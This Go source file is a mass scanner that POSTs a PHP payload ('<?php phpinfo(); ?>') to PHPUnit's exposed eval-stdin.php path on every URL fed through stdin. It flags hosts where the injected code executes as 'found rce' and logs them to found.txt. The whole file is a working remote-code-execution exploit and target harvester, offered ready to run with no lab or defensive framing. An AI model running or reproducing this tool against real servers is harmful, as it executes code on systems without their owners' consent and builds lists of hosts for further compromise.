package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"unsafe"
)

//slice of paths to scan
var paths []string

//default scan path
var defaultPath string = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"

//payload
var payload string = "<?php phpinfo(); ?>"

var wg sync.WaitGroup

var wgLog sync.WaitGroup

var foundChannel chan string

func main() {

	foundChannel = make(chan string)

	//pathFile flags
	var pathFile string
	flag.StringVar(&pathFile, "path", "", "Scanning path file")

	flag.Parse()

	//show banner
	showBanner()

	if pathFile == "" {
		paths = append(paths, defaultPath)
	} else {
		var err error
		paths, err = loadPathFile(pathFile)
		if err != nil {
			fmt.Println("Error Loading Path", err.Error())
			os.Exit(0)
		}
	}
	//log of discoveries
	wgLog.Add(1)
	go recordLog()

	if hasStdin() {
		scanInputFromReader(os.Stdin)
	}

	wg.Wait()
	close(foundChannel)
	wgLog.Wait()
	fmt.Println("done")
}

func showBanner() {
	const banner = `
	____  _     _____     ____  ____  _  ____        ____  ____    _  _    ____  ____ ____  _     
	/   _\/ \ |\/  __/    /_   \/  _ \/ \/ _  \      /__  \/ ___Y\ / |/ \  / ___\/   _Y  _ \/ \  /|
	|  /  | | //|  \ _____ /   /| / \|| |\/ | |_____ |\/  |\ \ /|_\| || |  |    \|  / | / \|| |\ ||
	|  \__| \// |  /_\____Y   /_| \_/|| |   | |\____\\__  |/ /_\\  | || |  \___ ||  \_| |-||| | \||
	\____/\__/  \____\    \____/\____/\_/   \_/         \_/\____/  \_|\_/  \____/\____|_/ \|\_/  \|`
	fmt.Println(banner)
}

//load path file
func loadPathFile(path string) (result []string, err error) {
	fileHandle, err := os.OpenFile(path, os.O_RDONLY, 0666)
	if err != nil {
		return nil, err
	}
	defer fileHandle.Close()

	reader := bufio.NewReader(fileHandle)

	for {
		line, _, err := reader.ReadLine()
		if err == io.EOF {
			break
		}
		result = append(result, string(line))
	}
	return result, nil
}

func hasStdin() bool {
	fi, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	if fi.Mode()&os.ModeNamedPipe == 0 {
		return false
	}
	return true
}

func scanInputFromReader(reader io.Reader) {
	scanner := bufio.NewScanner(reader)
	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())
		if url != "" {
			wg.Add(1)
			go startScan(url)
		}
	}
}

func startScan(host string) {
	defer wg.Done()
	for _, path := range paths {
		url := host + path
		rep, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewReader([]byte(payload)))
		if err != nil {
			fmt.Println("Fatal error", err.Error())
			return
		}
		defer rep.Body.Close()
		content, err := ioutil.ReadAll(rep.Body)
		if err != nil {
			fmt.Println("fatal error", err.Error())
		}

		str := (*string)(unsafe.Pointer(&content))
		re := regexp.MustCompile(`PHP License as published by the PHP Group`)
		hasVul := re.MatchString(*str)
		if hasVul {
			flag := fmt.Sprintf("\x1b[0;32m found rce\x1b[0m")
			foundChannel <- url
			fmt.Println(fmt.Sprintf("%s: %s", url, flag))
		} else {
			flag := fmt.Sprintf("\x1b[0;31m not found rce\x1b[0m")
			fmt.Println(fmt.Sprintf("%s: %s", url, flag))
		}
	}
}

//record log
func recordLog() {
	defer wgLog.Done()
	pwd, _ := os.Getwd()
	file := pwd + "/found.txt"
	fileHandle, err := os.OpenFile(file, os.O_CREATE|os.O_RDWR|os.O_APPEND, 0766)
	if err != nil {
		fmt.Println("log error", err.Error())
	}
	defer fileHandle.Close()
	for url := range foundChannel {
		fileHandle.WriteString(url + "\n")
	}
}
